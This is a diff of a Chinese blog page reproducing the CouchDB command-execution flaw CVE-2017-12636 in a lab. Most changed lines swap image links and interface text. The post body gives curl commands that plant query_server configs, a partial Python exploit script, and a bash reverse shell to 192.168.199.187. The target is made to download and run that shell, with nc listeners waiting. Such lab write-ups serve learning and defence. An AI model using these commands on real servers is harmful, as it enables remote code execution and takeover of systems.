@@ -38,13 +38,22 @@
 <body>
 <div class="side-navigate hide-area">
   
-  
-    <div class="item next">
-      <a href="/2019/07/21/1 day/5/">
+    <div class="item prev">
+      <a href="/2019/07/03/1 day/4/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        nginx文件解析漏洞
+        APPWeb认证绕过漏洞CVE-2018-8715
+      </div>
+    </div>
+  
+  
+    <div class="item next">
+      <a href="/2019/06/11/1 day/11/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        Linux基线加固
       </div>
     </div>
   
@@ -123,11 +132,30 @@
   <article id="post">
     <h1>CouchDB任意命令执行漏洞（CVE-2017-12636）</h1>
     <p class="page-title-sub">
-      <span id="post-title-date">Created at 2019-07-21</span>
+      <span id="post-title-date">撰写于 2019-07-02</span>
       
-        <span id="post-title-updated">Updated at 2019-07-22</span>
+        <span id="post-title-updated">修改于 2019-08-05</span>
       
       
+      <span id="post-title-categories">分类
+      
+      
+        
+        
+        <a href="/categories/漏洞复现/">漏洞复现</a>
+      
+      </span>
+      
+      
+      <span id="post-title-tags">
+      标签
+      
+      
+        
+        
+        <a href="/tags/CouchDB任意命令执行漏洞（CVE-2017-12636）/">CouchDB任意命令执行漏洞（CVE-2017-12636）</a>
+      
+      </span>
       
     </p>
     
@@ -136,22 +164,21 @@
 <p>&emsp;<br>&emsp;</p>
 <h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217:5984<br>攻击者IP：192.168.199.187<br>&emsp;</p>
 <h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><ol>
-<li>访问靶机后，出来的页面如下图所示</li>
+<li>访问靶机后，出来的页面如下图所示<br><a href="https://imgchr.com/i/egVxjx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egVxjx.png" alt="egVxjx.png"></a><br>再访问一下<a href="http://192.168.199.217:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/</a></li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEbe72f5d061bc83257bad465a6d245bcb/10605" alt><br>再访问一下<a href="http://192.168.199.217:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/</a></p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEa7cefdfa7f4768f808aad78dfc6fb13c/10608" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/eBLytI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBLytI.png" alt="eBLytI.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="2">
 <li>新增query_server配置，执行以下命令：<br>curl -X PUT ‘<a href="http://liupanpan:lpp@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://liupanpan:lpp@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>（liupanpan:lpp是账户：密码，写入执行的命令）</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE69ec0c66ae68fc2f1ead08fc96493ca4/10622" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/eBLLcT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBLLcT.png" alt="eBLLcT.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="3">
 <li>新建一个临时库和临时表，插入一条记录：<br>curl -X PUT ‘<a href="http://liupanpan:lpp@192.168.199.217:5984/liutest&#39;" target="_blank" rel="noopener">http://liupanpan:lpp@192.168.199.217:5984/liutest&#39;</a><br>curl -X PUT ‘<a href="http://liupanpan:lpp@192.168.199.217:5984/liutest/lpp&#39;" target="_blank" rel="noopener">http://liupanpan:lpp@192.168.199.217:5984/liutest/lpp&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE096523d8f4438bb916be567e331e4e45/10627" alt><br><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEede392693797210bab379bd2fb97008b/10629" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/eBOFgK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBOFgK.png" alt="eBOFgK.png"></a><br><a href="https://imgchr.com/i/eBOnUA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBOnUA.png" alt="eBOnUA.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="4">
 <li>调用query_server处理数据<br>curl -X PUT <a href="http://liupanpan:lpp@192.168.199.217:5984/liu/_design/vul" target="_blank" rel="noopener">http://liupanpan:lpp@192.168.199.217:5984/liu/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“lpp”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE9609ee11d57de653d7745c6304de2f87/10648" alt></p>
+<p><a href="https://imgchr.com/i/eBOQ8P" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBOQ8P.png" alt="eBOQ8P.png"></a></p>
 <ol start="5">
 <li>这里我创建了一个一个脚本/home/lpp.py<br>#!/usr/bin/env python3<br>import requests<br>import json<br>import base64<br>from requests.auth import HTTPBasicAuth</li>
 </ol>
@@ -164,41 +191,41 @@
 <p>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>&emsp;<br>将上面的脚本选取自己的版本，中间的command也可对应做修改<br>&emsp;<br>&emsp;</p>
 <ol start="6">
 <li>准备反弹shell<br>在/home/index.html<br>bash -i &gt;&amp; /dev/tcp/192.168.199.187/8888 0&gt;&amp;1<br>这条命令的作用就是创建一个可以交互的bash和一个到192.168.199.187:8888的TCP链 接，然后将bash的输入输出错误都重定向到在192.168.199.187:8888监听的进 程中。<br>&emsp;<br>&emsp;</li>
-<li>另外开启一个终端，开启HTTP服务<br>IP依然使用：192.168.199.193<br>cd /home &amp;&amp; python -m SimpleHTTPServer 9999<br>（在kali中的home目录中开启HTTP的9999端口）<br><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE4895c95a2ae03119211914d5b9c6d04b/10775" alt><br>&emsp;<br>&emsp;</li>
+<li>另外开启一个终端，开启HTTP服务<br>IP依然使用：192.168.199.193<br>cd /home &amp;&amp; python -m SimpleHTTPServer 9999<br>（在kali中的home目录中开启HTTP的9999端口）<br><a href="https://imgchr.com/i/egZfaD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egZfaD.png" alt="egZfaD.png"></a><br>&emsp;<br>&emsp;</li>
 <li>修改lpp.py脚本中的内容<br>把脚本中的command后面的命令改为curl 192.168.199.187:9999 -o /tmp/lpp<br>保存退出，并执行这个脚本<br>这时可以看到另外一个终端中开放的HTTP9999端口有GET请求</li>
 </ol>
 <p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE4150b12188e66f83d0256ad470dc379f/10781" alt><br>HTTP服务成功监听到下载请求。<br>&emsp;<br>&emsp;</p>
 <ol start="9">
 <li>再打开一个终端，进行监听本地8888端口<br>nc -vvl 8888</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE52eee34fe754feb720cb3a0212e250e8/10789" alt></p>
+<p><a href="https://imgchr.com/i/egZHMt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egZHMt.png" alt="egZHMt.png"></a></p>
 <ol start="10">
 <li>修改lpp.py脚本中的command的值改为<br>bash /tmp/lpp<br>保存并执行<br>那边直接监听成功，成功弹出shell</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE213b9937d614772dfa8f47dc022300b0/10795" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egZqqf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egZqqf.png" alt="egZqqf.png"></a><br>&emsp;<br>&emsp;</p>
 <h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><ol>
 <li>首先我在自己的Mac电脑上把桌面上的内容进行了发布<br>python -m SimpleHTTPServer 8888<br>在我的桌面上有一个shabi.html，里面的内容是<br>bash -i &gt;&amp; /dev/tcp/192.168.199.187/8888 0&gt;&amp;1（反弹shell的一个命令）</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEf06e84fb0c1769aaee3830f272435c77/10806" alt></p>
+<p><a href="https://imgchr.com/i/egZXdS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egZXdS.png" alt="egZXdS.png"></a></p>
 <ol start="2">
 <li>新增一个query_server的配置，需要执行以下命令<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/_config/query_servers/liupanpan&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/_config/query_servers/liupanpan&#39;</a> -d ‘“curl 192.168.199.183:8888/shabi.html -o /tmp/liu”‘</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE8353ff1d142ff8aaca78396843e4b1f5/10812" alt><br>第一条命令的意思是把刚才第1步中生成的反弹shell(shabi.html)下载并保存到/tmp/liu<br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/_config/query_servers/bb2&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/_config/query_servers/bb2&#39;</a> -d ‘“bash /tmp/liu”‘</p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE2767f794a1dfc4f837fcdb36104fecec/10862" alt><br>第二条命令的意思是执行/tmp/liu<br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/bbtest&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest&#39;</a><br>第三条命令的意思是新建一个临时表，表名为bbtest</p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE9368d1089543da6315c72b016bb46305/10910" alt><br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/bbtest/bb&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest/bb&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’</p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEb76b6255f29dd5e713ee7bd2bb4dbe8f/10935" alt><br>第四条命令的意思就是在bbtest这个表中添加一条数据<br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egeSRs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egeSRs.png" alt="egeSRs.png"></a><br>第一条命令的意思是把刚才第1步中生成的反弹shell(shabi.html)下载并保存到/tmp/liu<br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/_config/query_servers/bb2&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/_config/query_servers/bb2&#39;</a> -d ‘“bash /tmp/liu”‘</p>
+<p><a href="https://imgchr.com/i/ege1eK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/ege1eK.png" alt="ege1eK.png"></a><br>第二条命令的意思是执行/tmp/liu<br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/bbtest&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest&#39;</a><br>第三条命令的意思是新建一个临时表，表名为bbtest</p>
+<p><a href="https://imgchr.com/i/ege3dO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/ege3dO.png" alt="ege3dO.png"></a><br>&emsp;<br>curl -X PUT ‘<a href="http://192.168.199.217:5984/bbtest/bb&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest/bb&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’</p>
+<p><a href="https://imgchr.com/i/egeJFe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egeJFe.png" alt="egeJFe.png"></a><br>第四条命令的意思就是在bbtest这个表中添加一条数据<br>&emsp;<br>&emsp;</p>
 <ol start="3">
 <li>调用query_server处理数据，执行两条命令<br>curl -X POST ‘<a href="http://192.168.199.217:5984/bbtest/_temp_view?limit=11&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest/_temp_view?limit=11&#39;</a> -d ‘{“language”:”bb1”,”map”:””}’ -H ‘Content-Type: application/json’<br>curl -X POST ‘<a href="http://192.168.199.217:5984/bbtest/_temp_view?limit=11&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984/bbtest/_temp_view?limit=11&#39;</a> -d ‘{“language”:”bb2”,”map”:””}’ -H ‘Content-Type: application/json’<br>&emsp;<br>同时执行上面两条数据，在两个终端中分别输入<br>然后再开一个虚拟机，监听端口8888，nc -lnvp 8888<br>&emsp;<br>同时也可在<a href="http://192.168.199.217:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/</a></li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEda787d44599bc6d5875f94fd0ac93580/10961" alt><br>点击进去Configuration即可看到我写的命令和添加的表的内容<br><a href="http://192.168.199.217:5984/_utils/config.html" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/config.html</a></p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE2f5b642664a4b625729d5df99e7b0d6e/10959" alt><br><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEec5fffe0beefa55fca0ae20ae67269fd/10958" alt></p>
+<p><a href="https://imgchr.com/i/egeBef" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egeBef.png" alt="egeBef.png"></a><br>点击进去Configuration即可看到我写的命令和添加的表的内容<br><a href="http://192.168.199.217:5984/_utils/config.html" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/config.html</a></p>
+<p><a href="https://imgchr.com/i/egeyFg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egeyFg.png" alt="egeyFg.png"></a><br><a href="https://imgchr.com/i/ege2Ss" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/ege2Ss.png" alt="ege2Ss.png"></a></p>
 
   </article>
   <div class="random-toc-area">
-  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
-  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
   <div class="random-toc">
-    <h2>Table of Content</h2>
+    <h2>目录</h2>
     <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CouchDB任意命令执行漏洞（CVE-2017-12636）"><span class="toc-text">CouchDB任意命令执行漏洞（CVE-2017-12636）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一种方法"><span class="toc-text">第一种方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#session-proxies"><span class="toc-text">session.proxies = {</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘http’-‘http-127-0-0-1-8085-39"><span class="toc-text">‘http’: ‘http://127.0.0.1:8085&#39;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-text">}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第二种方法"><span class="toc-text">第二种方法</span></a></li></ol></li></ol>
   </div>
 </div>
@@ -206,11 +233,13 @@
   
 <nav id="pagination">
   
-
+    <a href="/2019/07/03/1 day/4/" class="prev">&larr; 上一篇 APPWeb认证绕过漏洞CVE-2018-8715</a>
   
 
   
-    <a href="/2019/07/21/1 day/5/" class="next">Next post nginx文件解析漏洞 &rarr;</a>
+
+  
+    <a href="/2019/06/11/1 day/11/" class="next">下一篇 Linux基线加固 &rarr;</a>
   
 </nav>
 
